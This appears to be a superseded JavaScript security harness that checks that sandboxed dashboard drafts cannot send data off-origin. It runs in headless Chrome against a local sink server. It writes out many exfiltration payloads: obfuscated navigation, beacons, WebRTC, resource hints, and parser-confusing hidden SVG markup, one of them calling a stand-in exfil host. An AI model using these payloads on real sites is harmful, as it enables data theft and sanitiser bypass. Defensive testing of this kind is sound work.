// Phase 18: superseded for Phase 18+ stacks. The operator route is spec-only, so these HTML payloads can no longer be saved; spec_hostile_check.mjs and scenario_dashboard.py are the current proofs.
// Dev-machine harness (not product code): proves in a real headless browser (CDP) that no
// saved dashboard draft can send business rows off the dashboards origin (AGENT-07).
// Every payload is saved as an operator draft (that route is NOT lint-gated), given a
// preview token inserted straight into the stack DB, and opened. A local sink HTTP server
// counts every request and every TCP connection; a payload passes only with zero sink hits,
// the top frame still on the dashboards origin and no window opened. Controls must render.
// Never prints tokens, the ops key or query strings.
//
// Phase 12 gap closure: hidden-markup payloads must be refused (HTTP 422) by the lint-gated preview route.
// AGENT-07 fix: /frame serves the canonical HTML5 serialisation the linter checked; a 'dropped' payload
// (markup the spec parser does not build) must also make zero sink connections.
// Usage: node dashboard_nav_check.mjs [--list] [--secrets <file with OPS_KEY=...>]
// Env:   BASE_URL (http://127.0.0.1:9121) DASH_URL (http://127.0.0.1:9122)
//        PG_CONTAINER (ic-p12-postgres-1) OPS_KEY (or --secrets) CHROME (browser path)
// Exit:  0 pass, 1 fail, 2 usage/unhealthy, 3 no browser.
import { spawn, execFileSync } from 'node:child_process';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';

const LIB = '<script src="/d/_lib/chart.js-4.5.1/chart.umd.min.js" ' +
  'integrity="sha256-SERKgtTty1vsDxll+qzd4Y2cF9swY9BCq62i9wXJ9Uo="></script>';
const QUERIES = [{ id: 'probe', sql: 'SELECT 42 AS n', refresh_minutes: 5 }];
const N = 'd.rows[0].n';

// Each payload: s = sink origin (http://127.0.0.1:P), h = host:port, returns { head, js, mouse }.
// js runs inside fetch('./data/probe' + location.search).then(r => r.json()).then(d => { ... }).
const PAYLOADS = [
  ['dotted-self-alias-nav', (s, h) => ({ js:
    `const w = window.window; const a = 'loc'; const k = a + 'ation'; const s = '/'; ` +
    `w[k] = s + '/${h}/hit?n=' + ${N};` })],
  ['dotted-self-alias-nav-literal', () => ({ js:
    `const w = window.window; const a = 'loc'; const k = a + 'ation'; const s = '/'; ` +
    `w[k] = s + '/exfil.example.invalid/?n=' + ${N};` })],
  ['ownerdocument-join-nav', (s, h) => ({ js:
    `const D = document.getElementById('c').ownerDocument; const k = ['loc', 'ation'].join(''); ` +
    `D[k] = ['/', '/${h}/hit?n=', ${N}].join('');` })],
  ['anchor-dispatch-click', (s) => ({ js:
    `const el = document.getElementById('a'); const h = 'hr'; const k = h + 'ef'; ` +
    `el[k] = '${s}/hit?n=' + ${N}; el.dispatchEvent(new MouseEvent('click'));` })],
  ['dotted-self-webrtc', (s, h) => ({ js:
    `const g = globalThis.globalThis; const r = 'R'; const k = r + 'TCPeerConnection'; const P = g[k]; ` +
    `const pc = new P({iceServers: [{urls: 'turn:${h}?transport=tcp', username: 'u', credential: 'c'}]}); ` +
    `pc.createDataChannel('x'); pc.createOffer().then(o => pc.setLocalDescription(o));` })],
  ['event-view-nav', (s, h) => ({ mouse: true, js:
    `document.getElementById('x').addEventListener('mouseover', e => { const w = e.view; ` +
    `const a = 'loc'; const k = a + 'ation'; w[k] = '${s}/hit?n=' + ${N}; });` })],
  ['template-literal-key', (s, h) => ({ js:
    'const w = self.self; const a = \'loc\'; const k = `${a}ation`; ' +
    `w[k] = '${s}/hit?n=' + ${N};` })],
  ['concat-method', (s) => ({ js:
    `const D = document.body.ownerDocument; const k = 'loc'.concat('ation'); ` +
    `D[k] = '${s}/hit?n=' + ${N};` })],
  ['parent_dom', (s) => ({ js:
    `const a = parent.document.createElement('a'); a.href = '${s}/hit?n=' + ${N}; ` +
    `parent.document.body.appendChild(a); a.click();` })],
  ['top_location', (s) => ({ js: `top.location = '${s}/hit?n=' + ${N};` })],
  ['window_open', (s) => ({ js: `window.open('${s}/hit?n=' + ${N});` })],
  ['self_location', (s) => ({ js: `location.href = '${s}/hit?n=' + ${N};` })],
  ['meta_refresh', (s) => ({ js:
    `const m = document.createElement('meta'); m.httpEquiv = 'refresh'; ` +
    `m.content = '0;url=${s}/hit?n=' + ${N}; document.head.appendChild(m);` })],
  ['image_beacon', (s) => ({ js: `new Image().src = '${s}/hit?n=' + ${N};` })],
  ['cross_origin_fetch', (s) => ({ js: `fetch('${s}/hit?n=' + ${N}, {mode: 'no-cors'});` })],
  ['blob_navigation', (s) => ({ js:
    `const u = URL.createObjectURL(new Blob(['<img src="${s}/hit?b=1">'], {type: 'text/html'})); ` +
    `location.href = u;` })],
];
// Resource hints that page CSP may not govern (plan check warning 9).
const LINK_PAYLOADS = [
  ['link_preconnect', (s, h) => ({ head: `<link rel="preconnect" href="//${h}">`, js: '' })],
  ['link_dns_prefetch', (s, h) => ({ head: `<link rel="dns-prefetch" href="//${h}">`, js: '' })],
  ['link_prefetch', (s) => ({ head: `<link rel="prefetch" href="${s}/hit">`, js: '' })],
  ['link_runtime', (s) => ({ js:
    `const l1 = document.createElement('link'); l1.rel = 'preconnect'; l1.href = '${s}'; document.head.appendChild(l1); ` +
    `const l2 = document.createElement('link'); l2.rel = 'prefetch'; l2.href = '${s}/hit/' + ${N}; document.head.appendChild(l2);` })],
];
// Phase 12 gap closure (12-VERIFICATION gap 1): markup hidden from html.parser must be lint-refused
const refresh = (slashes, h) => `<meta http-equiv="refresh" content="0;url=${slashes}${h}/hit">`;
const HIDDEN_PAYLOADS = [
  ['hidden_svg_style_preconnect', (s, h) => ({ body: `<svg><style></svg><link rel="preconnect" href="//${h}"></style>`, js: '' })],
  ['hidden_svg_title_preconnect', (s, h) => ({ body: `<svg><title></svg><link rel="preconnect" href="//${h}"></title>`, js: '' })],
  ['hidden_svg_style_uppercase', (s, h) => ({ body: `<svg><style></svg><LINK REL=PRECONNECT HREF=//${h}></style>`, js: '' })],
  ['hidden_svg_style_meta_refresh', (s, h) => ({ body: `<svg><style></svg><meta http-equiv="refresh" content="0;url=//${h}/hit"></style>`, js: '' })],
  // AGENT-07 (12-VERIFICATION gap 1, post-merge fix): the old svg depth counter desynchronised by a
  // quoted closing tag or an unquoted value ending in '/', with an SVG <title> or <script> carrying
  // a meta refresh whose target is a backslash form of a protocol-relative URL.
  ['hidden_quoted_close_svg_title_refresh', (s, h) => ({ body: `<svg><g data-x="</svg>"><title>${refresh('/\\', h)}</title></g></svg>`, js: '' })],
  ['hidden_quoted_close_svg_script_refresh', (s, h) => ({ body: `<svg><g data-x="</svg>"><script>${refresh('/\\', h)}</script></g></svg>`, js: '' })],
  ['hidden_unquoted_slash_svg_title_refresh', (s, h) => ({ body: `<svg data-x=a/><title>${refresh('/\\', h)}</title></svg>`, js: '' })],
  ['hidden_unquoted_slash_svg_script_refresh', (s, h) => ({ body: `<svg data-x=a/><script>${refresh('/\\', h)}</script></svg>`, js: '' })],
  ['hidden_backslash_slash_refresh', (s, h) => ({ body: `<svg data-x=a/><title>${refresh('\\/', h)}</title></svg>`, js: '' })],
  ['hidden_double_backslash_refresh', (s, h) => ({ body: `<svg><g data-x="</svg>"><script>${refresh('\\\\', h)}</script></g></svg>`, js: '' })],
  // Canonical serving: html5lib drops this element, so the /frame bytes never contain it and the
  // browser must make no connection even though the operator route stores it unlinted.
  ['hidden_select_meta_refresh', (s, h) => ({ body: `<select>${refresh('//', h)}</select>`, js: '', dropped: true })],
];
const CONTROLS = ['control-draft', 'control-published'];

if (process.argv.includes('--list')) {
  for (const [id] of [...PAYLOADS, ...LINK_PAYLOADS, ...HIDDEN_PAYLOADS]) console.log(id);
  for (const id of CONTROLS) console.log(id);
  process.exit(0);
}

const argv = process.argv.slice(2);
const BASE = (process.env.BASE_URL || 'http://127.0.0.1:9121').replace(/\/$/, '');
const DASH = (process.env.DASH_URL || 'http://127.0.0.1:9122').replace(/\/$/, '');
const PG = process.env.PG_CONTAINER || 'ic-p12-postgres-1';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function usage(msg) { console.error(msg); process.exit(2); }

for (const u of [BASE, DASH]) {
  const host = new URL(u).hostname;
  if (!['127.0.0.1', 'localhost', '[::1]'].includes(host)) usage(`REFUSED: ${u} is not loopback`);
}
let KEY = process.env.OPS_KEY || '';
const si = argv.indexOf('--secrets');
if (!KEY && si >= 0 && argv[si + 1]) {
  try {
    const line = fs.readFileSync(argv[si + 1], 'utf8').split(/\r?\n/).find((l) => l.startsWith('OPS_KEY='));
    KEY = (line || '').slice(8).trim().replace(/^["']|["']$/g, '');
  } catch { /* handled below */ }
}
if (!KEY) usage('REFUSED: no OPS_KEY (env or --secrets <file>)');

async function api(method, p, body) {
  const r = await fetch(BASE + p, { method, headers: { 'x-ops-key': KEY, 'content-type': 'application/json' },
    body: body === undefined ? undefined : JSON.stringify(body) });
  const text = await r.text();
  let json = null; try { json = JSON.parse(text); } catch { /* not json */ }
  return { status: r.status, json, text };
}

function psql(sql) {
  return execFileSync('docker', ['exec', PG, 'psql', '-U', 'agent', '-d', 'agent_memory', '-v', 'ON_ERROR_STOP=1', '-c', sql],
    { env: { ...process.env, MSYS_NO_PATHCONV: '1' }, stdio: ['ignore', 'pipe', 'pipe'] }).toString();
}

function page(extra) {
  const head = extra.head || '';
  return '<!doctype html>\n<html lang="en"><head>\n<meta charset="utf-8">' +
    '<meta name="viewport" content="width=device-width, initial-scale=1">\n<title>Nav check</title>\n' +
    LIB + '\n' + head + '\n</head><body>\n<h1>Nav check</h1>' + (extra.body || '') + '<canvas id="c"></canvas>\n' +
    '<div id="x" style="position:fixed;left:0;top:0;width:100%;height:100%"></div>\n' +
    '<a id="a" href="#top">top</a>\n<script>\n' +
    "fetch('./data/probe' + location.search, { cache: 'no-store' })" +
    '.then(r => r.json()).then(d => {\n' +
    "  new Chart(document.getElementById('c'), { type: 'bar', data: { labels: ['n'], " +
    "datasets: [{ label: 'n', data: d.rows.map(r => r.n) }] } });\n" +
    (extra.js || '') + '\n' +
    "}).catch(e => { document.title = e.message; });\n</script></body></html>\n";
}

// ---- sink oracle
// conns = every TCP connect; dataConns = connects that sent at least one byte. Chrome opens a
// bare speculative socket when a navigation starts (before the frame-src check) and sends
// nothing on it, so navigation payloads fail only on requests or bytes; WebRTC and link-hint
// payloads (connection is the channel) fail on any connect.
let hits = 0; let conns = 0; let dataConns = 0;
const sink = http.createServer((req, res) => { hits++; res.statusCode = 204; res.end(); });
sink.on('connection', (sock) => {
  conns++;
  let seen = false;
  sock.on('data', () => { if (!seen) { seen = true; dataConns++; } });
  sock.on('error', () => {});
});
await new Promise((r) => sink.listen(0, '127.0.0.1', r));
const SINK_PORT = sink.address().port;
const S = `http://127.0.0.1:${SINK_PORT}`;
const H = `127.0.0.1:${SINK_PORT}`;

// ---- browser
function findBrowser() {
  const cands = [process.env.CHROME, 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe'];
  for (const c of cands) if (c && fs.existsSync(c)) return c;
  const sep = process.platform === 'win32' ? ';' : ':';
  for (const n of ['google-chrome', 'chromium', 'chromium-browser']) {
    for (const d of (process.env.PATH || '').split(sep)) { const p = path.join(d, n); if (d && fs.existsSync(p)) return p; }
  }
  return null;
}
const browser = findBrowser();
if (!browser) { console.log(JSON.stringify({ skip: 'no Chrome/Edge found' })); process.exit(3); }

let child; let ud; let ws; let exitCode = 1;
const results = []; const versionIds = [];
const pending = new Map(); let nextId = 0;
const listeners = new Set();
const send = (method, params = {}, sessionId) => new Promise((res) => {
  const id = ++nextId; pending.set(id, res);
  ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
});

async function startBrowser() {
  ud = fs.mkdtempSync(path.join(os.tmpdir(), 'ic-nav-'));
  child = spawn(browser, ['--headless=new', '--disable-gpu', '--no-first-run', '--no-default-browser-check',
    '--remote-debugging-port=0', `--user-data-dir=${ud}`, 'about:blank'], { stdio: 'ignore' });
  let port = null;
  for (let i = 0; i < 40 && !port; i++) {
    await sleep(500);
    try { port = fs.readFileSync(path.join(ud, 'DevToolsActivePort'), 'utf8').split('\n')[0].trim(); } catch { /* wait */ }
  }
  if (!port) throw new Error('DevToolsActivePort not found');
  const v = await (await fetch(`http://127.0.0.1:${port}/json/version`)).json();
  ws = new WebSocket(v.webSocketDebuggerUrl);
  await new Promise((res, rej) => { ws.onopen = res; ws.onerror = () => rej(new Error('ws error')); });
  ws.onmessage = (ev) => {
    const m = JSON.parse(ev.data);
    if (m.id && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); return; }
    for (const l of listeners) l(m);
  };
}

// Open url in a fresh page target; observe iframe children, new page targets and windowOpen.
async function openAndObserve(url, { mouse = false, waitMs = 6000, evalExpr = null } = {}) {
  const obs = { newPages: 0, windowOpen: 0, frames: [] };
  let ownTarget = null;
  const created = new Set();
  let preexisting = new Set();
  const l = (m) => {
    if (m.method === 'Target.targetCreated' && m.params.targetInfo.type === 'page' && !preexisting.has(m.params.targetInfo.targetId)) created.add(m.params.targetInfo.targetId);
    if (m.method === 'Page.windowOpen') obs.windowOpen++;
    if (m.method === 'Target.attachedToTarget' && (m.params.targetInfo || {}).type === 'iframe') {
      obs.frames.push(m.params.sessionId);
      send('Runtime.enable', {}, m.params.sessionId);
    }
  };
  listeners.add(l);
  try {
    const before = await send('Target.getTargets');
    preexisting = new Set((before.result?.targetInfos || []).map((t) => t.targetId));
    await send('Target.setDiscoverTargets', { discover: true });
    const t = await send('Target.createTarget', { url: 'about:blank' });
    ownTarget = t.result.targetId;
    const a = await send('Target.attachToTarget', { targetId: ownTarget, flatten: true });
    const sid = a.result.sessionId;
    await send('Page.enable', {}, sid); await send('Runtime.enable', {}, sid);
    await send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }, sid);
    await send('Page.navigate', { url }, sid);
    if (mouse) {
      await sleep(2500);
      await send('Input.dispatchMouseEvent', { type: 'mouseMoved', x: 100, y: 100 }, sid);
    }
    await sleep(waitMs);
    const top = await send('Runtime.evaluate', { expression: 'location.href', returnByValue: true }, sid);
    obs.topUrl = top.result?.result?.value || '';
    if (evalExpr) {
      const child = obs.frames[obs.frames.length - 1];
      const r = child ? await send('Runtime.evaluate', { expression: evalExpr, returnByValue: true }, child) : null;
      obs.evalValue = r?.result?.result?.value ?? null;
    }
    obs.newPages = [...created].filter((id) => id !== ownTarget).length;
    await send('Target.closeTarget', { targetId: ownTarget });
    return obs;
  } finally { listeners.delete(l); }
}

const CONTROL_EXPR = `(() => { const inst = (typeof Chart === 'function' && Chart.instances) ? Object.values(Chart.instances) : [];
  let pts = 0; for (const c of inst) for (const d of (c.data && c.data.datasets) || []) pts = Math.max(pts, (d.data || []).length);
  return { lib: typeof Chart === 'function', charts: inst.length, points: pts }; })()`;

async function saveDraft(slug, code, note) {
  const r = await api('POST', `/api/dashboards/${slug}/versions`,
    { title: 'Nav check', code, queries: QUERIES, change_note: note });
  if (r.status !== 200) throw new Error(`save ${slug}: HTTP ${r.status} ${r.text.slice(0, 160)}`);
  versionIds.push(r.json.version_id);
  return r.json;
}

function previewToken(versionId) {
  const token = crypto.randomBytes(32).toString('base64url');
  const digest = crypto.createHash('sha256').update(token, 'utf8').digest('hex');
  psql(`INSERT INTO dashboard_preview_tokens (token_sha256, version_id, expires_at) VALUES ('${digest}', ${Number(versionId)}, now() + interval '30 minutes')`);
  return token;
}

async function waitForRows(slugPath, query) {
  const end = Date.now() + 60000;
  while (Date.now() < end) {
    try {
      const r = await fetch(`${DASH}${slugPath}/data/probe?${query}`);
      if (r.status === 200) { const j = await r.json(); if (Array.isArray(j.rows) && j.rows.length) return true; }
    } catch { /* retry */ }
    await sleep(2000);
  }
  return false;
}

function slugFor(id) { return 'navcheck-' + id.replace(/_/g, '-'); }

async function runPayload(id, build, isLink) {
  const spec = build(S, H);
  const slug = slugFor(id);
  const v = await saveDraft(slug, page(spec), 'nav check ' + id);
  const tok = previewToken(v.version_id);
  const base = `/d/${slug}/v/${v.version}`;
  if (!(await waitForRows(base, 'p=' + tok))) return { id, pass: false, reason: 'data rows never arrived', slug, version: v.version };
  hits = 0; conns = 0; dataConns = 0;
  const strict = isLink || id === 'dotted-self-webrtc';
  const obs = await openAndObserve(`${DASH}${base}/?p=${tok}`, { mouse: !!spec.mouse });
  const reasons = [];
  if (hits) reasons.push(`sink requests=${hits}`);
  if (strict ? conns : dataConns) reasons.push(`sink connections=${conns} with-bytes=${dataConns}`);
  if (!(obs.topUrl || '').startsWith(DASH + '/')) reasons.push('top frame left the dashboards origin');
  if (obs.newPages || obs.windowOpen) reasons.push('a window opened');
  if (!reasons.length) return { id, pass: true, link: isLink, bareConnects: conns, slug, version: v.version };
  return { id, pass: false, link: isLink, reason: reasons.join('; '), slug, version: v.version };
}

try {
  const h = await fetch(`${BASE}/health`).catch(() => null);
  if (!h || h.status !== 200) usage(`unhealthy: ${BASE}/health`);
  await startBrowser();

  for (const [id, build] of PAYLOADS) {
    const r = await runPayload(id, build, false);
    results.push(r); console.log(r.pass ? `PASS ${id}` : `FAIL ${id} ${r.reason}`);
  }
  for (const [id, build] of LINK_PAYLOADS) {
    const r = await runPayload(id, build, true);
    if (!r.pass && r.slug) {
      // Resource hints may be outside what CSP/sandbox govern: the lint-gated route must refuse the page.
      const pv = await api('POST', `/api/dashboards/${r.slug}/versions/${r.version}/preview`, {});
      if (pv.status === 422) { r.gap = true; r.pass = true; console.log(`GAP ${id} browser does not govern resource hints (${r.reason}); lint-gated preview refused with 422`); }
      else console.log(`FAIL ${id} ${r.reason}; GAP not lint-refused (HTTP ${pv.status})`);
    } else console.log(r.pass ? `PASS ${id}` : `FAIL ${id} ${r.reason}`);
    results.push(r);
  }

  // Hidden-markup payloads: whatever the browser did, the lint-gated preview route must answer 422.
  for (const [id, build] of HIDDEN_PAYLOADS) {
    const r = await runPayload(id, build, true);
    const pv = await api('POST', `/api/dashboards/${r.slug}/versions/${r.version}/preview`, {});
    const dropped = !!build(S, H).dropped;
    r.hidden = true; r.gap = !r.pass; r.conns = conns;
    r.pass = pv.status === 422 && (!dropped || conns === 0);
    console.log(r.pass ? `PASS ${id} lint-gated preview refused (422); browser sink connections=${conns}`
      : `FAIL ${id} lint-gated preview returned HTTP ${pv.status}, sink connections=${conns}; ` +
        (dropped ? 'canonical serving must drop this markup and the preview must refuse it'
          : 'hidden markup must be refused'));
    results.push(r);
  }

  // ---- controls: a lint-clean draft and a published version still render in the sandboxed frame
  const cs = 'navcheck-control';
  const cv = await saveDraft(cs, page({ js: '' }), 'nav check control');
  const ctok = previewToken(cv.version_id);
  const cbase = `/d/${cs}/v/${cv.version}`;
  let okRows = await waitForRows(cbase, 'p=' + ctok);
  const dr = await fetch(`${DASH}${cbase}/?p=${ctok}`);
  const wcsp = dr.headers.get('content-security-policy') || '';
  const fr = await fetch(`${DASH}${cbase}/frame?p=${ctok}`);
  const fcsp = fr.headers.get('content-security-policy') || '';
  const hdrOk = wcsp.includes("frame-src 'self'") && fcsp.includes('sandbox allow-scripts') && !fcsp.includes('allow-same-origin');
  let obs = await openAndObserve(`${DASH}${cbase}/?p=${ctok}`, { evalExpr: CONTROL_EXPR });
  const dctl = okRows && hdrOk && obs.evalValue && obs.evalValue.lib && obs.evalValue.charts >= 1 && obs.evalValue.points >= 1;
  results.push({ id: 'control-draft', pass: !!dctl });
  console.log(dctl ? 'PASS control-draft' : `FAIL control-draft rows=${okRows} headers=${hdrOk} eval=${JSON.stringify(obs.evalValue)}`);

  let people = await api('GET', '/api/people');
  let pid = Array.isArray(people.json) ? people.json[0]?.id : people.json?.people?.[0]?.id;
  if (!pid) { const c = await api('POST', '/api/people', { name: 'Nav Check Operator', role: 'operator' }); pid = c.json?.created; }
  const pub = await api('POST', `/api/dashboards/${cs}/publish`, { version: cv.version, decided_by: pid });
  const dash = await api('GET', `/api/dashboards/${cs}`);
  const vt = dash.json?.dashboard?.view_token || dash.json?.view_token;
  let pctl = false;
  if (pub.status === 200 && vt) {
    okRows = await waitForRows(`/d/${cs}`, 't=' + vt);
    obs = await openAndObserve(`${DASH}/d/${cs}/?t=${vt}`, { evalExpr: CONTROL_EXPR });
    pctl = okRows && obs.evalValue && obs.evalValue.lib && obs.evalValue.charts >= 1 && obs.evalValue.points >= 1;
  }
  results.push({ id: 'control-published', pass: !!pctl });
  console.log(pctl ? 'PASS control-published' : `FAIL control-published publish=${pub.status} eval=${JSON.stringify(obs.evalValue)}`);

  const failed = results.filter((r) => !r.pass).map((r) => r.id);
  const gaps = results.filter((r) => r.gap && !r.hidden).map((r) => r.id);
  const hidden = results.filter((r) => r.hidden).map((r) => r.id);
  console.log(JSON.stringify({ ok: failed.length === 0, failed, gaps, hidden, total: results.length,
    dashboards: [...PAYLOADS, ...LINK_PAYLOADS, ...HIDDEN_PAYLOADS].map(([id]) => slugFor(id)).concat(['navcheck-control']) }));
  exitCode = failed.length ? 1 : 0;
} catch (e) {
  console.error('nav check failed: ' + String(e.message || e).replace(/p=[A-Za-z0-9_-]+/g, 'p=REDACTED'));
  exitCode = 2;
} finally {
  try { if (versionIds.length) psql(`DELETE FROM dashboard_preview_tokens WHERE version_id IN (${versionIds.map(Number).join(',')})`); } catch { /* ignore */ }
  try { ws?.close(); } catch { /* ignore */ }
  if (child) child.kill();
  sink.close();
  await sleep(500);
  if (ud) try { fs.rmSync(ud, { recursive: true, force: true }); } catch { /* ignore */ }
}
process.exit(exitCode);
